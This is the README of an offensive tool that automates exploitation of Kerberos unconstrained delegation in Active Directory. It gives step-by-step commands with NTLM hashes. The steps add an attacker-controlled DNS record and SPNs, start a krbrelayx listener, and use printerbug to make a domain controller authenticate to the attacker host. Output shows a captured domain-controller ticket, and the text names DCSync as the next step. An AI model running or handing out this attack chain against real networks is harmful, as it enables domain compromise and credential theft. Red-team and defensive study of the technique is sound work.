# Invoke-Unconstrained  
The Invoke-Unconstrained tool automates the exploitation of a compromised machine with unconstrained delegation.

The idea of this tool is to fully automate the exploitation of unconstrained delegation without relying on domain joined machines in order to avoid EDRs or XDRs.  
Several ways can be used to accomplish this task, but they have many steps and are complicated to understand, so the purpose of that tool is to automate the whole steps to compromise a machine using unconstrained delegation issue.  
Additionally, a snapshot of the old state is created to revert changes after the exploitation process.  
This Invoke-Unconstrained tool is based on the `impacket` library which allows attacker to launch that tool from linux-based OS, and also support the same default authentication methods as configured on the impacket library.

### How to Use  
The tool supports multiple authentication methods, including plain-text passwords, NTLM hashes, and Kerberos tickets.


#### General Arguments:  
`-u` - Specify username (The domain should be provided with a backslash, e.g., `LAB\DEG$`).  
`-t` - Specify Vunlerable target.  
`-ah` - Specify a non-exists DNS record that will be point to the attacker-controlled IP Address.  
`-aip` - Specify the controlled attacker IP address that will be added under the attacker's DNS record. 
`-p` - Specify plaintext/NTLM password matched to the username.  
`-k` - Force Kerberos authentication.

Sucessfull output will look as follows:  

The following proof of concept illustrates performing unconstrained delegation attack using NTLM hash using the DEG machine account on the lab domain:  
During the automation process, the tool creates a new DNS record controlled by the attacker (`ATT28.labs.local` -> `10.0.0.12`) to the domain controller (`10.0.0.5`).  
This automation involves LDAP authentication, afterwards, the tool adds new SPNs according to the newly-created DNS record (the `ATT28` attacker host which was added to the `msds-additionaldnshostname` attribute of the `DEG$` machine account).

  
```
Invoke-unconstrained.py -u LABS\DEG$ -p aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc -t DEG$ -ah ATT28.labs.local -aip 10.0.0.12  10.0.0.5
```
![Pasted image 20231025191014](https://github.com/ScorpionesLabs/Invoke-Unconstrained/assets/50461376/1cd0b85c-61be-40ea-8540-036210585631)

#### Reverting Changes:
Among red teams, we believe that the cleanup process is required after an attack. This feature will roll back all changes to the way they were before the attack.  

The following example shows how to rollback changes that performed on the victim user to the original state.
```
Invoke-unconstrained.py -u LABS\DEG$ -p aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc -r .\DEG-2023-10-17--18-20-42.961041 10.0.0.5
```

As can be seen above, on each exploitation, a state file is created which shows that changes made that needs to reverted, including target, SPNs, and DNS records added.  

#### Full Exploitation: 

Step 1:  
```bash
Invoke-unconstrained.py -u LABS\DEG$ -p aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc -t DEG$ -ah ATT30.labs.local -aip 192.168.117.134 192.168.117.131
```
Step 2 \(This step get executed automatically if you are on Linux, you might need to use aesKey if kerberos encrypts ticket with that\): 
```bash
python3 krbrelayx.py -hashes aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc
[*] Servers started, waiting for connections
```

Step 3:
```bash
python3 printerbug.py LABS/DEG\$@192.168.117.131 -hashes aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc ATT30.labs.local
[*] Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

[*] Attempting to trigger authentication via rprn RPC at 192.168.117.131
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

Step 4: 
```bash
[*] SMBD: Received connection from 192.168.117.131
[*] Got ticket for DC01$@LABS.LOCAL [krbtgt@LABS.LOCAL]
[*] Saving ticket in DC01$@LABS.LOCAL_krbtgt@LABS.LOCAL.ccache
```


After the fourth step, we have obtained a ticket of the domain controller and now we can perform a DCSync attack.  


### Credits

1. Omri Baso From [Scorpiones Labs](https://www.scorpiones.io/).  
2. Some of the code snippets were taken from the [krbrelayx](https://github.com/dirkjanm/krbrelayx/tree/master) Project.  
